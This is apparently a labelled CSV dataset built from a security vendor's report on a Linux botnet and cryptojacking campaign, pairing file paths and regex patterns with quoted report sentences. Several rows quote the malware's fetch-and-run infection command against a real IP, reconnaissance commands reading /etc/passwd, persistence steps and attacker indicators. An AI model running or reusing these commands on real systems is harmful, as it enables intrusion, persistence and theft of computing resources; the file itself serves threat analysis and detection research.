report,word,verb,objectType,prettyReg,match,label,asgSyscall,sentence
Demonbot-bitdefender.csv,.5p4rk3l5,be,FILE,.5p4rk3l5,0,0,,"Their names differ between versions of the loader, so we will refer to those in the .93joshua script: · .k93 is used to launch the miner (.k4m3l0t) · /usr/bin/sshd is a systemd service script that launches .k93 · .5p4rk3l5 is a crontab file that executes .93joshua and .k93 Several persistence methods are employed: · creating a user and adding it to the sudo group; various names are used: gh0stx, sclipicibosu, mexalzsherifu · adding a SSH key to authorized_keys (attackers cycled through three different keys depending on the script) · creating a systemd service called myservice which runs the /usr/bin/sshd script:"
Demonbot-bitdefender.csv,/usr/bin/.pidsclip,,FILE,.pidsclip,0,0,, Paths: /usr/bin/.locationesclipiciu /var/tmp/.ladyg0g0/.pr1nc35 /usr/.SQL-Unix/.SQL/.db /var/tmp/.SQL-Unix/.SQL/.db /usr/bin/.pidsclip Network indicators: Mexalz.us area17.mexalz.us 45.32.112.68 207.148.118.221 requests.arhive.online cdn.arhive.online Attack matrix:
Demonbot-bitdefender.csv,.report_system,,FILE,.report_system,0,0,,The front page of 45.32.112.68: The front page of mexalz.us: The following tree shows an aggregated representation of the files currently or formerly hosted on mexalz.us: mexalz.us |-- .sherifu/ |   |   .93joshua |   |   .k4m3l0t |   |   .purrple |   |   .zte_error |   |   find.sh |   |-- jack.tar.gz |   |   |-- .jack1992/ |   |   |   |   brute |   |   |   |   dabrute |   |   |   |   lists/ |   |   |   |   mass |   |   |   |   masscan |   |   |   |   pass |   |   |   |   ranges_1.lst |   |   juanito.tar.gz |   |   |-- .juanito/ |   |   |   |   brute |   |   |   |   go |   |   |   |   pass |   |   |   |   ps2 |   |   |   |   r |   |   kamelot.tar.gz |   |   |-- .md/ |   |   |   go |   |   |   haiduc |   |   |   pass |   |   satan.db |   |   scn.tar.gz |   |   |-- .md/ |   |   |   go |   |   |   haiduc |   |   |   pass |   |   sefu |   |   skamelot.tar.gz |   |   |-- .b87kamelot/ |   |   |   |   99x |   |   |   |   go |   |   |   |   p |   |   |   |   r |   |   sky |-- .mini |   |   .black |   |   .report_system |   |   PhoenixMiner.tar |   |   banner |   |   ethminer.tar |   |   masscan
Demonbot-bitdefender.csv,/usr/bin/.locationesclipiciu,,FILE,/.*bin/.locationesclipiciu,0,0,, Paths: /usr/bin/.locationesclipiciu /var/tmp/.ladyg0g0/.pr1nc35 /usr/.SQL-Unix/.SQL/.db /var/tmp/.SQL-Unix/.SQL/.db /usr/bin/.pidsclip Network indicators: Mexalz.us area17.mexalz.us 45.32.112.68 207.148.118.221 requests.arhive.online cdn.arhive.online Attack matrix:
Demonbot-bitdefender.csv,/usr/bin/.pidsclip,,FILE,/.*bin/.pidsclip,0,0,, Paths: /usr/bin/.locationesclipiciu /var/tmp/.ladyg0g0/.pr1nc35 /usr/.SQL-Unix/.SQL/.db /var/tmp/.SQL-Unix/.SQL/.db /usr/bin/.pidsclip Network indicators: Mexalz.us area17.mexalz.us 45.32.112.68 207.148.118.221 requests.arhive.online cdn.arhive.online Attack matrix:
Demonbot-bitdefender.csv,/usr/bin/sshd,be,FILE,/.*bin/sshd,0,0,,"Their names differ between versions of the loader, so we will refer to those in the .93joshua script: · .k93 is used to launch the miner (.k4m3l0t) · /usr/bin/sshd is a systemd service script that launches .k93 · .5p4rk3l5 is a crontab file that executes .93joshua and .k93 Several persistence methods are employed: · creating a user and adding it to the sudo group; various names are used: gh0stx, sclipicibosu, mexalzsherifu · adding a SSH key to authorized_keys (attackers cycled through three different keys depending on the script) · creating a systemd service called myservice which runs the /usr/bin/sshd script:"
Demonbot-bitdefender.csv,/etc/passwd,intend/add,FILE,"/etc/passwd[-]{0,1}",1,1,open(),"*/\\1/p' nproc --all nvidia-smi -q | grep \Product Name\ lspci cut -d: -f6 /etc/passwd | grep \/home/\ Notably, one of the commands intends to discover the GPU model, which would be useful to judge the victim's potential in a cryptojacking scheme"
Demonbot-bitdefender.csv,/tmp,wget,FILE,/tmp.*,0,0,,"The infection payload follows these simple steps: cd /tmp cd /run cd /; wget http://194.33.45.197:8080/chernobyl/chernobyl.sh; chmod 777 chernobyl.sh; sh chernobyl.sh chernobyl; tftp 194.33.45.197 -c get chernobyltftp1.sh; chmod 777 chernobyltftp1.sh; sh chernobyltftp1.sh chernobyl; tftp -r chernobyltftp2.sh -g 194.33.45.197; chmod 777 chernobyltftp2.sh; sh chernobyltftp2.sh chernobyl; rm -rf chernobyl.sh chernobyltftp1.sh chernobyltftp2.sh; rm -rf *; history -c sky is a common Perl IRC bot, customized only in respect to the server details and used nicknames"
Demonbot-bitdefender.csv,/var/tmp/.ladyg0g0/.pr1nc35,,FILE,/tmp.*,0,0,, Paths: /usr/bin/.locationesclipiciu /var/tmp/.ladyg0g0/.pr1nc35 /usr/.SQL-Unix/.SQL/.db /var/tmp/.SQL-Unix/.SQL/.db /usr/bin/.pidsclip Network indicators: Mexalz.us area17.mexalz.us 45.32.112.68 207.148.118.221 requests.arhive.online cdn.arhive.online Attack matrix:
Demonbot-bitdefender.csv,"/usr/.SQL-Unix/.SQL/.db,",use,FILE,/usr/.SQL-Unix/.*,0,0,,"The auxiliary file /usr/.SQL-Unix/.SQL/.db, used to store part of the commands, is executed via the source built-in in .bashrc"
